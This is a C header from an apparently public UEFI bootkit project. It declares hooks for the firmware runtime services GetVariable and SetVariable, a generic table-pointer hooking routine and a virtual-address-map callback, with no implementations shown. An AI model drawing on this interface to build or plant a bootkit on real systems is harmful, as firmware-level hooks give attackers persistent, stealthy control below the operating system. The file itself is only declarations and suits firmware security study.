/*
 * Copyright (C) 2022 xmmword
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#ifndef __HOOKS_H
#define __HOOKS_H

#include <Uefi.h>
#include <Guid/EventGroup.h>
#include <Library/UefiLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>


/*
    *    src/bootkit/Hooks.h
    *    Date: 12/14/22
    *    Author: @xmmword
*/


VOID EFIAPI VMapEvent(EFI_EVENT EfiEvent, VOID *Context);
VOID *HookPointer(VOID **Function, VOID *HookFunction, EFI_TABLE_HEADER *Header);

EFI_STATUS EFIAPI GetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid,
  OUT UINT32 *Attributes, OPTIONAL IN OUT UINTN *DataSize, OUT VOID *Data OPTIONAL);

EFI_STATUS EFIAPI SetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, 
  IN UINT32 Attributes, IN UINTN DataSize, IN VOID *Data);

#endif